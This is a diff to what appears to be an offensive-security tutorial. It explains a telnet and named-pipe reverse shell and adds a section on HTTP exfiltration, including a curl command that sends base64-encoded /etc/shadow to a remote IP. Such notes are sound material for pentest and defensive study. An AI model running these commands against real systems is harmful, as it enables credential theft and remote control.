@@ -31,7 +31,8 @@ Fairly simple. Now let's get a reverse shell::
 What's happening?
 
 - Line 1 creates a named pipe called "mypipe" that we can use to push data in and out.  If we were using netcat's `-e` option, all the interaction would be done for us, but we need to do our own plumbing.
-  - Line 2 is running telnet and connecting to our open port. The first bit of trickery is `0<mypipe` which connects standard input (channel 0) to the pipe such that things going into the pipe get diverted into telnet.  The second part (`| /bin/bash > mypipe`) pipes the output from telnet into a bash shell, which then has it's own output redirected back into the pipe so that it gets connected telnet's input.
+  
+- Line 2 is running telnet and connecting to our open port. The first bit of trickery is `0<mypipe` which connects standard input (channel 0) to the pipe such that things going into the pipe get diverted into telnet.  The second part (`| /bin/bash > mypipe`) pipes the output from telnet into a bash shell, which then has it's own output redirected back into the pipe so that it gets connected telnet's input.
 
 TODO: Write something on pipes. Named and unnamed, redirection, standard channels, etc.  With diagrams.
   
@@ -57,5 +58,16 @@ Or::
 As a HTTP request
 =================
 
+Sometimes it's easiest to get the data out as an HTTP request.  The benefits are:
 
+- It requires fairly basic tools only. Most systems have soem way to send HTTP requests, such as curl or wget, but could even be done in the URL bar of a browser if you've got access to one.
+- It looks like web browsing.  Especially if you can do it on port 80 or 443 (for HTTPS).
+
+There are a number of special tools for running a web server to capture data.  One is given here: ./src/exfiltrate.py
+
+Example exfiltration::
+
+  curl http://10.10.10.12:8765?fname=shadow\&form=b64\&data=`cat /etc/shadow|base64`
+
+    
 
